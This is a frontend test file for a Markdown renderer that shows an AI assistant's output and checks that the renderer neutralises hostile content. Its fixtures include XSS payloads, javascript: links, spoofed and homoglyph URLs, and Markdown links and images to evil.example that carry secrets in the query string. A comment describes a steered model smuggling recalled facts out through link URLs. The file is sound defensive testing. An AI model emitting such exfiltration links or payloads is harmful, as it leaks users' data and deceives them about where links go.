import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { Markdown } from '@/shared/ui/markdown'

// Built from code points, so no invisible character lives in this file.
const OVERRIDE = String.fromCodePoint(0x202e)
const CYRILLIC_I = String.fromCodePoint(0x456)

// Assistant text and repository content are attacker-controlled: rendered as Markdown, never as
// raw HTML (.doc/conventions.md › Agent security).
describe('Markdown', () => {
  it('renders emphasis, lists and code', () => {
    render(<Markdown>{'**bold** and `code`\n\n- one\n- two'}</Markdown>)

    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getByText('code').tagName).toBe('CODE')
    expect(screen.getAllByRole('listitem')).toHaveLength(2)
  })

  it('leaves raw HTML inert', () => {
    const { container } = render(
      <Markdown>{'hello <img src="x" onerror="alert(1)"> <script>alert(1)</script>'}</Markdown>,
    )

    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    // Shown as the literal text it is.
    expect(container.textContent).toContain('<img src="x"')
  })

  it('turns a Markdown image into a link showing its alt text, so nothing loads unasked', () => {
    const { container } = render(
      <Markdown>{'![the diagram](https://evil.example/p.png?d=secret)'}</Markdown>,
    )

    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: 'the diagram' })
    expect(link).toHaveAttribute('href', 'https://evil.example/p.png?d=secret')
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'))
    expect(link).toHaveAttribute('target', '_blank')
  })

  it('shows a fixed label for an image with no alt text', () => {
    const { container } = render(<Markdown>{'![](https://evil.example/p.png)'}</Markdown>)

    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByRole('link', { name: 'Image' })).toBeInTheDocument()
  })

  it('drops a javascript: link target', () => {
    render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>)

    const link = screen.queryByRole('link', { name: 'click' })
    expect(link?.getAttribute('href') ?? '').not.toMatch(/javascript:/i)
  })

  it('opens a normal link safely', () => {
    render(<Markdown>{'[docs](https://example.com/a)'}</Markdown>)

    const link = screen.getByRole('link', { name: 'docs' })
    expect(link).toHaveAttribute('href', 'https://example.com/a')
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'))
  })

  // A link is the one way out of a run that no approval sees: a steered model can put recalled
  // facts in the URL and choose the words the person reads. Real order and layout are in
  // tests/e2e/conversation-link.spec.ts, because jsdom has neither.
  describe('shows where a link goes', () => {
    function hostOf(text: string) {
      const { container } = render(<Markdown>{text}</Markdown>)
      return container.querySelector('bdi')
    }

    it.each([
      ['a labelled link', '[the docs](https://evil.example/?d=secret)'],
      ['an image, which is a link too', '![Open it](https://evil.example/p.png?d=x)'],
      ['a label with formatting', '[**bold** docs](https://evil.example/)'],
      ['a label that is a different URL', '[https://github.com/acme](https://evil.example/?d=s)'],
      ['a bare URL', 'https://evil.example/a'],
      ['a URL in angle brackets', '<https://evil.example/a>'],
      ['a label that is exactly its URL', '[https://evil.example/a](https://evil.example/a)'],
      ['an override before a bare URL', `${OVERRIDE}https://evil.example/moc.buhtig//:sptth`],
      ['an override written as a reference', '&#x202E;https://evil.example/moc.buhtig//:sptth'],
      ['an override in the label', `[the docs${OVERRIDE}](https://evil.example/?d=secret)`],
      ['a login part in a label', '[x](https://github.com@evil.example/)'],
      ['a login part in a bare URL', 'https://github.com@evil.example/?d=secret'],
      ['a login and a password', '<https://github.com:pass@evil.example/>'],
      ['a login that repeats a host', 'https://evil.example.github.com@evil.example/'],
      // The label reads as one GitHub URL once the image renders its alt text.
      [
        'an image inside the words of a URL',
        '[https://![github.com/acme/app?ref=]()evil.example/?d=secret](https://evil.example/?d=secret)',
      ],
    ])('names the real host of %s, before its words', (_, text) => {
      const host = hostOf(text)

      expect(host).toHaveAttribute('dir', 'ltr')
      expect(host?.firstElementChild).toHaveTextContent('(evil.example)')
      expect(host?.lastElementChild?.tagName).toBe('A')
    })

    it('keeps the host of an encoded name in the form the browser reads', () => {
      expect(hostOf('<https://github.com%2eevil.example/>')).toHaveTextContent(
        '(github.com.evil.example)',
      )
    })

    it('shows a lookalike domain in the ASCII form that gives it away', () => {
      expect(hostOf(`[x](https://g${CYRILLIC_I}thub.com/)`)).toHaveTextContent('(xn--')
    })

    it('keeps the port, which is part of where the link goes', () => {
      expect(hostOf('[x](https://evil.example:8443/)')).toHaveTextContent('(evil.example:8443)')
    })

    it('keeps the true host in front when an image in the words shows another', () => {
      const host = hostOf('[the docs ![x](https://github.com/)](https://evil.example/?d=s) more')

      expect(host?.firstElementChild).toHaveTextContent('(evil.example)')
    })

    // A link to this page cannot carry anything out, and the noise would teach a person to skip
    // the host on the links that can.
    it.each([
      ['a footnote', 'a[^1]\n\n[^1]: plain'],
      ['a fragment', '[x](#frag)'],
      ['a relative path', '[x](/conversation)'],
    ])('adds nothing beside %s', (_, text) => {
      expect(hostOf(text)).toBeNull()
    })
  })

  it('shares a table out equally, so a wide column cannot push a host out of view', () => {
    const { container } = render(<Markdown>{'| A | B |\n| --- | --- |\n| a | b |'}</Markdown>)

    expect(container.querySelector('table')).toHaveClass('table-fixed')
  })

  it.each([
    ['mail', '[send it](mailto:a@evil.example?body=secret)'],
    ['a chat', '[send it](xmpp:a@evil.example?message;body=secret)'],
    ['a script', '[send it](javascript:alert(1))'],
  ])('leaves only the words of a link to %s', (_, text) => {
    const { container } = render(<Markdown>{text}</Markdown>)

    expect(screen.queryByRole('link')).toBeNull()
    expect(container.textContent).toBe('send it')
  })
})
